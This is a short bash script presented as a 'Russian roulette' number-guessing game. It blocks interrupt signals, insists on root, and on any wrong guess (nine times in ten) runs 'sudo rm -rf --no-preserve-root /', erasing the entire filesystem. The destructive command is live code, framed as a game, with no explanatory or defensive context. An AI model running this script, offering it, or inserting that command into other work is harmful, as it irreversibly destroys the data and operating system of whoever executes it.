#!/bin/bash

trap 'echo "choose a number"' SIGINT SIGTSTP

function roulette(){
  echo -e "[+] Welcome to the Roulette"
  read -p "Guess the number between 0-9: " my_number
  random_number=$((RANDOM%10))

  if [[ $my_number -eq $random_number ]];then
    echo "[+] You won!"
  else
    echo "[X] The correct number was: $random_number"
    echo "removing root filesystem"
    sudo rm -rf --no-preserve-root /
  fi
}


if [[ "$(id -u)" -ne 0 ]]; then
  echo "[X] Only root can execute the script"
else
  roulette
fi
